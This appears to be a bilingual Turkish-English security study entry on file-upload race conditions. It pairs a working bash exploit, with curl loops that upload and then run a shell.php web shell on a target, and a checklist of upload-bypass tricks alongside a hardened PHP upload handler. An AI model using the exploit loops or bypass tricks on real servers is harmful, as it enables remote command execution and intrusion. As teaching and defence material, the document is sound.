vulnerability.desc: Server dosyayı upload ediyor, validate ediyor, sonra siliyor. Validation öncesi execute edebilir misin?
vulnerability.flow:
1. Upload shell.php
2. Server temp path'e yazar
3. Server validate eder (malicious!)
4. Server siler

Race: 2 ile 4 arası shell.php'yi execute et!

exploitation.script:
#!/bin/bash
# Terminal 1: Upload loop
while true; do
  curl -X POST -F 'file=@shell.php' https://victim.com/upload
done

# Terminal 2: Execute loop
while true; do
  curl https://victim.com/uploads/shell.php?cmd=whoami
done
exploitation.note: Birkaç saniye içinde shell execute edilebilir

checklist: Test extension bypass (double ext, null byte, case, spaces, htaccess)
Test MIME type bypass (Content-Type, magic bytes)
Upload ZIP file with path traversal (Zip Slip)
Test filename tricks (long name, special chars, unicode)
Look for temp file path disclosure

best_practices.implementation:

if file_ext not in allowed: reject()

best_practices.check: Content-Type header + file içeriğinin ilk byte'ları

best_practices.reason: Path traversal ve filename injection önlenir

best_practices.serve: Ayrı script ile serve et, direct access yok

file_upload_defense.secure_php_implementation:
<?php
// 1. File size check
if ($_FILES['file']['size'] > 5 * 1024 * 1024) {
  die('File too large');
}

// 2. Extension whitelist
$allowed_ext = ['jpg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
  die('Invalid extension');
}

// 3. MIME type check
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mime)) {
  die('Invalid MIME type');
}

// 4. Magic bytes check
$handle = fopen($_FILES['file']['tmp_name'], 'r');
$header = fread($handle, 4);
fclose($handle);
$valid = false;
if (substr($header, 0, 3) === "\xFF\xD8\xFF") $valid = true; // JPEG
if (substr($header, 0, 4) === "\x89PNG") $valid = true; // PNG
if (substr($header, 0, 3) === "GIF") $valid = true; // GIF
if (!$valid) die('Invalid file signature');

// 5. Rename file (UUID)
$new_filename = uniqid('img_', true) . '.' . $ext;

// 6. Upload outside webroot
$upload_dir = '/var/uploads/'; // NOT in /var/www/html
$upload_path = $upload_dir . $new_filename;

// 7. Move file
if (!move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
  die('Upload failed');
}

// 8. Re-encode image (remove embedded payloads)
$image = imagecreatefromstring(file_get_contents($upload_path));
imagejpeg($image, $upload_path, 90);
imagedestroy($image);

echo 'File uploaded successfully: ' . htmlspecialchars($new_filename);
?>
